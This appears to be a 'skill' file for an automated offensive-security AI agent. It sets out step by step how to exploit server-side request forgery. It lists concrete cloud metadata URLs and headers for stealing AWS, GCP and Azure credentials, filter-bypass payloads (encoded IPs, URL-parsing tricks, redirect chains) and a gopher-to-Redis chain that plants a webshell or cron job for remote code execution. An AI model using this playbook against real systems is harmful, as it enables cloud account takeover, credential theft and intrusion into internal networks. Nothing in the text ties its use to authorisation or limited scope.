# skill: ssrf_master
title: SSRF & Cloud Metadata Chains (PATT SSRF corpus)
when: ssrf,metadata,169.254,internal,webhook,import,parser,redirect,fetch,proxy

## OPERATING PRINCIPLE
SSRF is the bug that reaches INSIDE the server's network: the app fetches a
URL you control (or influence), so your request is issued from the server's
own position — behind the firewall, with its credentials, against its
metadata service. One fetch primitive, the whole internal world.

## FIND THE FETCH PRIMITIVE (js_mine_site + endpoint_oracle feed this)
- URL parameters that render content: url, src, target, feed, host, domain,
  path, image, document, callback, next, redirect, data, reference, site, html
- Feature surfaces: PDF generators, "import from URL", webhook testers,
  avatar fetchers, link previews, file processors, HTML-to-X converters,
  RSS readers, SSO/SAML metadata loaders.
- Read the JS: client-side URL construction into those endpoints = the map.

## CHAIN
1. ssrf_probe(url, param) — loopback + cloud metadata + alternate IP
   representations. Read the differential carefully: a 200 from
   169.254.169.254 is the master key.
2. Confirm blind SSRF with TIME: internal hosts answer fast, filtered
   ports time out, open internal ports answer slow-but-present.
3. Escalate by protocol: http → file:// (local file read via fetchers that
   accept schemes) → gopher:// (speak arbitrary TCP: redis, SMTP, internal
   HTTP with full request control) → dict://.
4. CLOUD METADATA — the jackpot ladder:
   - EC2 classic: http://169.254.169.254/latest/meta-data/iam/security-credentials/
   - EC2 IMDSv2: PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds
     header first — needs an SSRF that can issue PUT with custom headers
   - GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
     + header Metadata-Flavor: Google
   - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
     + header Metadata: true
   Keys returned = cloud takeover: scope them, report the blast radius.
5. Internal recon through the hole: internal hostnames from error messages,
   application configs read via file://, then port-touch internal ranges
   via timing (slow responses = open ports behind the firewall).

## BYPASS GRAMMAR (when the app filters "http://evil.com")
- IP literal forms: 169.254.169.254 = 2852039166 (decimal) = 0xA9.0xFE.0xA9.0xFE
  = 0xA9FEA9FE = 169.254.169.254.nip.io (DNS) = short-hand 169.254.18650
- DNS rebinding (concept): attacker domain A-records flip after the filter checks
- URL parsing chaos: http://trusted.com@169.254.169.254/ (userinfo),
  http://169.254.169.254#@trusted.com/ (fragment), http://trusted.com\@169.254.169.254
- Redirect ladder: your server 302s to the internal target (filter checks
  the FIRST hop only)
- Scheme relativity: //169.254.169.254/ — protocol-inherited
- Encodings: %69%69.254..., double-encode, unicode homoglyphs where parsers differ

## PIVOTS
- Credentials from metadata → cloud_takeover skill (skill_load cloud_takeover)
- Internal web apps discovered → attack them THROUGH the SSRF (the app's
  position is your position) — send full attack chains via gopher/http
- Redis via gopher://: flushall + write webshell/cron = RCE classic chain

## FAILURE MODES
- All requests return the same body: the fetcher may cache — vary the URL
  noise (random query param) and re-read.
- Metadata 403: IMDSv2 hop required (PUT token first) or hop limit — try
  internal-only first: SSRF into the app's OWN internal admin panel.
- Filter blocks every IP form: look for redirect-based bypass first —
  filters check input, redirects happen after validation.
